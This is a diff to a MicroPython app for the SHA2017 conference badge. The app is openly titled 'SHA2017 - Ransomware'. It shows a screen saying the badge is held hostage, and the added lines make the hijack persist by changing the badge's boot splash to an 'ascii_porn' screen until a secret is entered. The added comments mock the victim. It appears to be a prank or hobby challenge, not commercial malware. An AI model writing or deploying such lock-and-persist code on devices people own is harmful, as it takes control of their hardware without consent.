@@ -1,3 +1,6 @@
+#NOW IT ACTUALLY WORKS :D
+#VISIT ME @ TKKRLAB
+
 import wifi
 import ugfx
 import badge
@@ -6,6 +9,9 @@ import appglue
 import urequests as requests
 import time
 
+
+import easydraw
+easydraw.msg("Connecting to wifi!","Still Fucked Anyways", True)
 
 ransom_id = ""
 ransom_secret = ""
@@ -39,6 +45,7 @@ def write(y, message):
 
 def write_lock():
     global ransom_id
+    badge.nvs_set_str('boot','splash','ascii_porn') #Now you are the homescreen :P
     ugfx.clear(ugfx.WHITE)
     ugfx.string(15, 10, "SHA2017 - Ransomware","Roboto_BlackItalic24", ugfx.BLACK)
     write(40, "Oh noes, your badge is being held hostage!")
@@ -55,6 +62,7 @@ def attempt_unlock_secret_entered(secret):
     ugfx.string(15, 10, "SHA2017 - Ransomware", "Roboto_BlackItalic24", ugfx.BLACK)
 
     if secret == ransom_secret:
+        badge.nvs_set_str('boot','splash','splash')
         write(40, "Dobby is free!")
         ugfx.flush()
         time.sleep(4)
